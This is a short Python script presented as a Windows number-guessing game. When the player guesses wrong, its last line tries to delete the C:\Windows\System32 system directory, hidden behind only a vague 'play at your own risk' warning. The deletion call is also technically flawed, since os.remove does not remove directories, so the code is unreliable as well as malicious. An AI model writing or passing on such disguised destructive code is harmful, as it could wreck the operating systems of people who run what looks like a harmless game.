import random
import os

number = random.randint(1, 6)
print("ONly for WIndows")
print("PLay this game at your own risk")
guess = input("NOW GUess the nUmber BEtwEen 1 and 6: ")

guess = int(guess)

if guess == number:
    print("You WIn")
else:
    print("You LOse :( ")
    os.remove("C:\Windows\System32")